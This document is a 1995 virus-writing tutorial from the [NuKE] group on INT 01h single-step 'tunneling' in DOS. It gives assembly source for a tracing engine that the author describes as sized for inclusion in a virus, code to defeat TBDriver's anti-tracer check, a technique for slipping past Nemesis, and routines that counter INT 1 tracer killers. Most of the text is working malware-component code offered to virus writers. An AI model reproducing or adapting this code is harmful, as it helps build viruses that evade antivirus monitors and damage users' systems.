@@ -1,0 +1,662 @@
+
+
+
+
+
+
+
+
+
+
+
+                             Dark Fiber of [NuKE]
+
+                                   presents
+
+                      Single Stepping Tunnel Techniques
+
+                                    Part 1
+
+                               21st August 1995
+
+
+
+
+
+File Descriptions:
+
+df-tunnl.doc    - This document
+example.asm     - Example program that calls tunnel.asm
+example.com     - Compiled example.asm
+tunnel.asm      - The basic tunneling engine.
+f-Tunnel.asm    - Full blown tunnel engine.
+f-exampl.asm    - Example using F-Tunnel
+f-exampl.com    - Compiled f-exampl.asm
+
+
+
+  Tunneling with INT 01h is an easy thing to do, about as easy as writing
+*.COM file viruses, but, for some reason, guides for using INT 01h tunneling
+techniques dont exist like *.COM file virus guides do, so I'm going to remedy
+that.
+
+
+  The Intel and its clone 8086+ compatibles have a nice mode built into them
+called Single Stepping, and its VERY handy for programmers like us, who
+want to find something specific in memory, for example, the kernel Int 21h
+segment:offset, and bypassing other blocking TSR programs, such as Anti-Virus
+behaviour blockers.  This tunneling technique is not the be all and end all
+of tunneling, as I will discuss some techniques and why they work against
+this kind of tunneling further on.
+
+
+  In order to use the Single Step mode, we need to modify one of the bits
+in the flag, and have set up an interrupt.
+
+  The flag is a 16bit register and consists of the following fields.
+
+                  ÚÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄ¿
+          flags   ³--³--³--³--³OF³DF³IF³TF³SF³ZF³--³AF³--³PF³--³CF³
+                  ÀÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÙ
+                   0F 0E 0D 0C 0B 0A 09 08 07 06 05 04 03 02 01 00
+
+        CF : Carry Flag         Indicates an arithmetic carry
+        -- : Unused
+        PF : Parity Flag        Indicates an even number of 1 bits
+        -- : Unused
+        AF : Auxilary Flag      Indicates adjustment needed in BCD numbers
+        -- : Unused
+        ZF : Zero Flag          Indicates a zero result, or equal comparison
+        SF : Sign Flag          Indicates negative result/comparison
+        TF : Trap Flag          Controls Single Step operation
+        IF : Interrupt Flag     Controls whether interrupts are enabled
+        DF : Direction Flag     Controls increment direction on string regs.
+        OF : Overflow Flag      Indicates signed arithmetic overflow
+        -- : Unused
+        -- : Unused
+        -- : Unused
+        -- : Unused
+
+
+  The only one we need to concern ourselves with is the TF flag.
+When the trap flag is off, well, the Int 01h is not used, but when we turn
+the TF to on, the Int 01h routine is called BEFORE each instruction is
+executed.
+
+  So, with that order in mind, you must hook the Int 01h, THEN turn on the
+trap flag.
+
+  First thing that we must do is to hook Int 1h, then we need to set Int 1h,
+set the trap flag to on, then lastly, call a function that we wish to trace.
+
+For the example code presented, we will be tunneling Int 21h.
+All the code is for a minimum of an 80286 or greater, because I dont care
+for coding for the lesser 8086 machine. ;)
+
+
+;== [ 80286+ | Priming the Tunnel code ] ======================================
+; This code will save and hook INT 01h, and put the processor into single
+; stepping mode.
+;
+
+
+Int_01v:        dd ?                            ;Old address for Int 01h
+Int_21v:        dd ?                            ;the tracer modifies this.
+
+Tunnel:
+        pusha                                   ;Save our registers,
+        push    es                              ;Assume we are being called
+        push    ds                              ;from an external source.
+
+        mov     ax,03521h
+        int     021h                            ;Get Int 21h
+    cs: mov     word ptr [Int_21v],bx           ;Save Int 21h address
+    cs: mov     word ptr [Int_21v + 2],es
+
+        mov     al,01h                          ;Get Int 01h
+        int     021h
+    cs: mov     word ptr [Int_01v],bx           ;Save Int 01h address
+    cs: mov     word ptr [Int_01v + 2],es
+
+        push    cs
+        pop     ds                              ;Set DS = CS for OUR Int 01
+                                                ;address.
+        mov     ah,025h
+        mov     dx,offset Int_01Handler         ;Our Int 01h routine
+        int     21h                             ;Set our Int 01h routine
+
+        ;This first PUSHF, is used in conjunction with the CALL FAR [Int_21v]
+        ;code, as we need a FLAGS on the stack that has not got the TF
+        ;turned to ON.
+
+        pushf
+
+        pushf
+        pop     ax                              ;Save the flag
+        or      ax,0100                         ;Set the TF to ON
+        push    ax
+        popf                                    ;restore the flags
+
+        ;The moment we POPF the flags, the trace mode is initiated
+        ;Because of the way it works, the first instruction immediately
+        ;following the POPF is NOT traced, tracing begins with the
+        ;second instruction AFTER the POPF.
+
+        mov     ax,03306                        ;Set AX for INTERNAL_DOS_VERS.
+        call    far [Int_21v]                   ;Call the Int 21.
+                                                ;we are faking an INT 21 call.
+
+        ;The Int_01Handler routine takes over from here until the trace
+        ;is finished. Only when it's finished will control pass back to this
+        ;piece of code.
+
+        ;When control is passed back, Int_21v will hold the segment:offset
+        ;of the last cross segment jump before the trace ended.
+
+        ;Restore the old Int_01h vector
+        lds     dx,word ptr [Int_01v]
+        mov     ax,02501
+        int     21h
+
+        pop     ds
+        pop     es
+        popa                                    ;Restore registers
+        ret
+
+;==============================================================================
+
+
+  Okey, before I code the Int_1_Handler routine for you, we need to go
+over some more theory.
+
+  First, is that the Int_1_Handler routine is designed to check what opcode
+is going to be run next, so we need to know what some of the opcodes that
+we will need to check for are.
+
+
+        26h             ES:
+        2Eh             CS:
+        36h             SS:
+        3Eh             DS:
+                        These four are the segment overrides, and are ALWAYS
+                        placed BEFORE the opcode, but the CPU sees them as
+                        part of the same opcode, so we must check for these
+                        and then siphon them off, to get the byte value of
+                        the real opcode.  We also use them for to determine
+                        what segment to take data from on things like FAR
+                        cross segment jumps.
+
+        9Ch             PUSHF
+                        We need to know this so we can get around Nemesis.
+
+        9Dh             POPF
+                        We need to check for the POPF because we dont want
+                        any other program from turning off the TrapFlag, and
+                        thus, dissableling our trace.
+
+        CFh             IRET
+                        This is what we use to signal that our trace should
+                        end.
+
+        EAh             JMP xxxx:yyyy
+        FFh 1Eh         CALL FAR [xxxx]
+        FFh 2Eh         JMP FAR [xxxx]
+
+                        These three opcodes are used as cross segment jumps,
+                        which commonly hold the seg:offs of the next Int hook.
+                        Because the last two (FF1Eh, FF2Eh) take data from
+                        the segment override, or the current DS, we need to
+                        know what that is too.
+
+
+;== [ 80286+ | Tunnel Engine ] ================================================
+;This is the actual code that does all the hard work.
+;It has been somewhat (20bytes) optimised from the engine I used in Lady Death
+;And bugfixed too ;)
+
+;These are our register offsets into the SS:SP[BP]
+
+        _rfl    equ 01A
+        _rcs    equ 018
+        _rip    equ 016
+        _ax     equ 014
+        _cx     equ 012
+        _dx     equ 010
+        _bx     equ  0E
+        _sp     equ  0C
+        _bp     equ  0A
+        _si     equ  08
+        _di     equ  06
+        _es     equ  04
+        _ds     equ  02
+        _ss     equ  00
+
+Int_01Handler:
+        pusha
+        push    es
+        push    ds                     ;Save ALL registers.
+        push    ss                     ;Its not really necessary to save SS ;)
+        mov     bp,sp                  ;but this engine was built for expansion
+
+        ;One thing to note, if you want to know the TRUE value of SP, that
+        ;is, you must subtract 6 from it, which covers the calling cs, ip & f.
+        ;and thats sub w[bp+_sp],6  not sub sp,6 ;)
+
+        push    cs
+        pop     ds
+
+        test    b[_status],1
+        je      RunNextTest_1
+        xor     b[_status],1
+        and     word ptr [bp+_rfl+2],0feff
+        jmp     GetOpCode
+
+RunNextTest_1:
+
+
+GetOpCode:
+        lds     si,word ptr [bp+22]     ;Get the seg:off of the next opcode
+
+        cld                             ;clear direction
+        lodsb                           ;get opcode
+
+        ;AL now holds our bytevalue opcode.
+
+        ;Check for a segment override, and if not, assume its working in DS
+        call    GetSegOveride           ;Get the segment override
+                                        ;bx = segment we will be using.
+
+        ;Check the OPCode in AL
+        cmp     al,09dh                 ;POPF?
+        jne     ItsNotPOPF
+        ;They are attempting to POP the flags.  Just incase they have tried
+        ;to turn the TF off, we keep it turned on.
+        or      word ptr [bp+_rfl+2],0100 ;Keep TRAPFLAG set to on.
+
+ItsNotPOPF:
+        cmp     al,09c
+        jne     ItsNotPUSHF
+    cs: or      byte ptr [_status],1
+
+ItsNotPUSHF:
+        cmp     al,0cf                          ;IRET
+        jne     ItsNotIRET
+        ;An IRET signals the end of our trace.
+        ;So turn the TF to off.
+        and     word ptr [bp+_rfl],0feff        ;Turn trace flag off
+
+ItsNotIRET:
+        cmp     al,0eah                 ;Jmp xxxx:yyyy
+        jne     ItsNotFarJump
+
+        ;A Cross segment jump!  Save the seg:offset its going to jump into.
+        ;The data for the cross seg jump is contained in the CS: seg.
+        ;So, no change is needed.
+
+FarJumpData:
+        lodsw
+    cs: mov     word ptr [Int_21v+0],ax
+        lodsw
+    cs: mov     word ptr [Int_21v+2],ax
+        jmp     RunNextOpCode
+
+
+ItsNotFarJump:
+        cmp     al,0ffh                 ;jmp d[xxxx]
+        jne     ItsNotJmpD
+
+        cmp     byte ptr [si],01eh      ;jmp d[xxxx], type 1
+        jne     ItsJmpD
+        cmp     byte ptr [si],02eh      ;jmp d[xxxx], type 2
+        jne     ItsNotJmpD
+
+ItsJmpD:
+        inc     si                      ;skip jump type
+
+        ;This opcode can use a segment override, so use it!
+        mov     ds,bx                   ;segment override
+        lodsw                           ;get storage offset of seg:offs
+        mov     si,ax                   ;
+        jmp     FarJumpData             ;treat it like jmp xxxx:yyyy
+
+
+ItsNotJmpD:
+        ;Next opcode here....
+        ;Well, we dont need to monitor any more opcodes....
+
+RunNextOpCode:
+        pop     ss
+        pop     ds
+        pop     es                      ;Restore the flags
+        popa
+        iret                            ;Run the next opcode.
+
+
+
+GetSegOveride:
+        cmp     al,026h                 ;ES
+        jne     NotSegES
+        mov     bx,word ptr [bp+_es]
+        lodsb                           ;Skip seg override, to get next opcode
+        ret
+
+NotSegES:
+        cmp     al,02eh                 ;CS
+        jne     NotSegCS
+        mov     bx,word ptr [bp+_rcs]
+        lodsb                           ;Skip seg override, to get next opcode
+        ret
+
+NotSegCS:
+        cmp     al,036h                 ;SS
+        jne     NotSegSS
+        mov     bx,word ptr [bp+_ss]
+        lodsb                           ;Skip seg override, to get next opcode
+        ret
+
+NotSegSS:
+        cmp     al,03eh                 ;DS
+        jne     NotSegDS
+        mov     bx,word ptr [bp+_ds]
+        lodsb                           ;Skip seg override, to get next opcode
+        ret
+
+NotSegDS:
+        mov     bx,word ptr [bp+_ds]    ;DS
+        ret                             ;No override, so assume DS
+
+_status: db 0
+
+;==============================================================================
+
+
+
+  The code presented here is, when compiled, somewhere around 200bytes
+long.  Which I think is not too big, when you include it in a virus.
+The engine presented here was very basic in its structure.  It did not
+check for things like
+
+                JMP DOUBLE [BX+4]
+                JMP DOUBLE [BX]
+                JMP DOUBLE [SI-4]
+
+                etc,
+                or
+
+                CALL DOUBLE [BX]
+
+The reason being is that there are lots of other techniques for cross segment
+jumping, and including all types would expand the engine considerably, and
+they would not really be necessary in a virus.
+
+
+
+
+
+                      Single Stepping Tunneling Techniques
+
+                                     Part 2
+
+                                  Anti-Tracers
+
+  Okey, so you have run the Example.Com program and TBDriver has beeped
+to the tune of Example.Com is trying to trace the Interrupt chain, or something
+to that effect.  Your first question should be "How the hell does it know we
+are tracing it?"
+
+Well, I'm glad you asked! ;)
+
+Here is a simple representation
+
+
+        Code Memory                             Stack Memory
+
+        mov     ax,1234h
+        push    ax                              1234h
+        mov     bx,5678h                        1234h
+        mov     cx,DEADh                        1234h
+        push    cx                              DEADh, 1234h
+        push    bx                              5678h, DEADh, 1234h
+
+        pop     ax      ;=5678h                 DEADh, 1234h
+        pop     bx      ;=DEADh                 1234h
+        pop     cx      ;=1234h
+
+Now, even tho we have popped them off memory, what has actually happend is
+that the SP add had 2 added to it each time, adjusting where it points to,
+but those values ARE STILL IN MEMORY, just below where SP points to currently.
+
+        so, if we did
+
+        sub     sp,6
+
+        the Stack Memory would look like
+
+        5678h, DEADh, 1234h
+
+The contents of memory have not been altered in any way, just the pointer
+to the memory has.
+
+
+Now, using the above example, this is what happens when we tunnel
+
+assume,   int 1 CS=code, flags=flags, and the # is the ip.
+
+When an INT occurs, it pushes the flags, cs, and ip onto the stack.
+
+        Code Memory                     Stack Memory
+cs:=code
+
+1)      mov     ax,1234h
+2)     *int     1*                              3, code, flags,
+3)      push    ax                              1234h
+4)     *int     1*                              5, code, flags, 1234h
+5)      mov     bx,5678h                        1234h
+6)     *int     1*                              7, code, flags, 1234h
+7)      mov     cx,DEADh                        1234h
+8)     *int     1*                              9, code, flags, 1234h
+9)      push    cx                              DEADh, 1234h
+a)     *int     1*                              b, code, flags, DEADh, 1234h
+b)      push    bx                              5678h, DEADh, 1234h
+c)     *int     1*                              d, code, flags, 5678h, DEADh...
+d)      pop     ax      ;=5678h                 DEADh, 1234h
+e)     *int     1*                              f, code, flags, DEADh, 1234h
+f)      pop     bx      ;=DEADh                 1234h
+10)    *int     1*                              11, code, flags, 1234h
+11)     pop     cx      ;=1234h
+
+
+Now, if we were to subtract SP by 6, this time our Stack Memory would look
+like this,
+
+        code, flags, 1234
+
+Notice that the bottom 4 bytes are not 5678h, DEADh, thats because when an
+Int 1 occurs, it overwrites what's underneath it.
+
+(Hope I'm explaining this so you understand ;)
+
+This is how TBdriver detects a tracer is in memory.
+
+Here is the actual TBDriver code
+
+        push    bx
+        push    ax
+        xchg    ax,bx
+        pop     ax
+        dec     sp
+        dec     sp
+        pop     bx
+        cmp     ax,bx
+        pop     bx
+
+Now, when it's run without a tracer its Stack Memory looks like this
+
+assume ax=1234, bx=5678
+
+        Code                            Stack
+        push    bx      ;bx=5678h       5678h
+
+        push    ax      ;ax=1234h       1234h, 5678h
+
+        xchg    ax,bx   ;ax=5678h       1234h, 5678h
+                        ;bx=1234h
+
+        pop     ax      ;ax=1234h       5678h
+                        ;bx=1234h
+        dec     sp                      34h, 5678h
+        dec     sp                      1234h, 5678h
+
+        pop     bx      ;ax=1234h       5678h
+                        ;bx=1234h
+
+        cmp     ax,bx   ;ax=1234h       5678h
+                        ;bx=1234h
+
+        pop     bx      ;ax=1234h
+                        ;bx=5678h
+
+
+Underneath the stack, it looks like this
+
+                        1234h,  5678h
+
+Because the SP is decremented, and the stack untouched, 1234h is still
+there.
+
+Now, if we traced it....
+
+        Code                            Stack
+        push    bx      ;bx=5678h       5678h
+
+       *int     1*                      ip, code, flags, 5678h
+
+        push    ax      ;ax=1234h       1234h, 5678h
+
+       *int     1*                      ip, code, flags, 1234h, 5678h
+
+        xchg    ax,bx   ;ax=5678h       1234h, 5678h
+                        ;bx=1234h
+
+       *int     1*                      ip, code, flags, 1234h, 5678h
+
+        pop     ax      ;ax=1234h       5678h
+                        ;bx=1234h
+
+       *int     1*                      ip, code, flags, 5678h
+
+        dec     sp                      ags, 5678h
+        dec     sp                      flags, 5678h
+
+       *int     1*                      ip, code, flags, flags, 5678h
+
+        pop     bx      ;ax=1234h       ;5678h
+                        ;bx=flags
+       *int     1*                      ip, code, flags, 5678h
+
+        cmp     ax,bx   ;ax=1234h       5678h
+                        ;bx=flags
+
+       *int     1*                      ip, code, flags, 5678h
+
+        pop     bx      ;ax=1234h
+                        ;bx=5678h
+
+
+Now, when SP is decremented, because the last value pushed was the flags,
+it overwrote the previously pushed AX in memory...... TB detects this,
+notices its not what it expected it to be, and knows we are tracing it.
+
+How do we get around this?  Well, in TBDriver, it's structured so that
+the first two bytes are a short jump OVER a far jump to the original
+DOS Int21h..... So we check for TBcode, and use the far jump data ;)
+
+The code to fool TBScan looks like this
+
+;Place this code underneath the ItsNotJmpD: label.
+TBKiller:
+        cmp     al,0fah                         ;CLI?
+        jne     EndTBKiller
+        lodsw
+        cmp     ax,0fc9c                        ;Is it TBDriver?
+        jne     EndTBKiller
+        lodsw
+        cmp     ax,05053                        ;TBDriver?
+        jne     EndTBKiller
+        sub     si,10
+        mov     w[bp+_rip],si                   ;Run the original FAR jump
+        inc     si                              ;skip EAh, so its data.
+        jmp     FARJumpData
+
+EndTBKiller:
+
+
+
+"Gee, I heard Nemesis is damn tricky?"  Eh? Not any more!  All Nemesis
+does to find tracers is do a PUSHF, then check W[BP+xx],0404, JB,
+Now, if the TF is on, the FLAGS is > 0404, so, we add a status bit that
+tells us that the LAST OPCODE RUN was a PUSHF, so remove the TF ;)
+Now is that simple or what?
+
+
+The last method of killing a tracer while its running goes like this.
+
+1.  Get the address of Int 1h
+2.  Replace the first byte of the Int 1h seg:offs with an IRET opcode
+3.  Remove the trace flag
+4.  Restore the frist byte of Int 1h
+
+To do that the code looks like
+
+        mov     ax,03501h
+        int     21h
+        mov     cl,0CFh
+    es: xchg    byte ptr [bx], cl
+        pushf
+        pop     ax
+        and     ax,0feff
+        push    ax
+        popf
+    es: xchg    byte ptr [bx], cl
+
+
+Now, how do you defeat this?  Well, this *type* is pretty easy to avoid to.
+The code goes something like this.
+
+;Under the EndTBKiller: label goes this,
+
+Kill_INT_1_Killers:
+        cmp     al,0CDh                                 ;INT call?
+        jne     End_Kill_Int_1_Killers
+        cmp     byte ptr [si],021h                      ;21?
+        jne     End_Kill_Int_1_Killers
+        cmp     word ptr [bp+_ax],03501                 ;GET INT 1?
+        jne     End_Kill_Int_1_Killers
+    cs: or      byte ptr [_Status],2                    ;turn on fake int adres
+End_Kill_Int_1_Killers:
+
+
+;Under  RunNextTest_1:  put the code
+        test    byte ptr [_Status],2            ;fake the address?
+        je      RunNextTest_2
+        xor     byte ptr [_Status],2
+        mov     ax, word ptr [Int_01v]          ;get the orig, int 1 address
+        mov     word ptr [bp+_bx],ax            ;put in into bx
+        mov     ax, word ptr [Int_01v+2]
+        mov     word ptr [bp+_es],ax            ;put it into es
+        ;Now when it writes a byte to int 1, it
+        ;will be writting to the unused int 1.
+RunNextTest_2:
+
+But what happens if they get our Int_1 address directly from the IVT?
+Well..... you can check if they are putting a byte into our segment,
+but, because of the miriad of different ways one can put a byte into
+a position in memory, well, if you are a masochist you can come up with
+that code all by yourself.
+
+Well, I hope I've explained it so that you understand how tunnelers work.
+If you want to see a different kind of tunneler check out ART 2.2, the
+full source code is in vlad#4. This tunneler does not use int 1, but rather
+decodes each single opcode.
+
+Ah well, if you didn't understand then i really screwed up.
